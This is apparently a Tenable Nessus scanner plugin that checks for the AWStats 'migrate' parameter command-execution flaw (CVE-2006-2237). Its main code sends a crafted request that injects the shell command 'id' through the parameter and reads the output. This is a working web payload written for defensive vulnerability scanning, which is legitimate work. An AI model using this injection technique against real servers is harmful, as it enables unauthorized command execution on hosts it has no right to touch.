#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21328);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2017/04/27 19:46:26 $");

  script_cve_id("CVE-2006-2237");
  script_bugtraq_id(17844);
  script_osvdb_id(25284);

  script_name(english:"AWStats migrate Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command using AWStats");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for the
execution of arbitrary commands.");
  script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free logfile analysis tool
written in Perl.

The version of AWStats installed on the remote host fails to sanitize
input to the 'migrate' parameter before passing it to a Perl 'open()'
function.  Provided 'AllowToUpdateStatsFromBrowser' is enabled in the
AWStats site configuration file, an unauthenticated attacker can exploit
this issue to execute arbitrary code on the affected host, subject to
the privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.osreviews.net/reviews/comm/awstats");
  script_set_attribute(attribute:"see_also", value:"http://www.awstats.org/awstats_security_news.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to AWStats version 6.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'AWStats migrate Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:laurent_destailleur:awstats");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("awstats_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/AWStats");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, embedded: 0);

install = get_install_from_kb(appname:'AWStats', port:port);
if (isnull(install)) exit(0, "The 'www/"+port+"/AWStats' KB item is missing.");
dir = install['dir'];

# Exploit the flaw to run a command.
cmd = "id";
host = get_host_name();
r = http_send_recv3(method:"GET",
    item:string(
      dir, "/awstats.pl?",
      "config=", host, "&",
      "migrate=|", cmd, ";exit|awstats052006.", host, ".txt"
    ),
    port:port
  );
if (isnull(r)) exit(1, "The web server on port "+port+" failed to respond");
res = r[2];

  if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    res = strstr(res, "uid=");
    res = res - strstr(res, "<br");

    report = string(
      "Nessus was able to execute the command 'id' on the remote host;\n",
      "the output was:\n",
      "\n",
      res
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
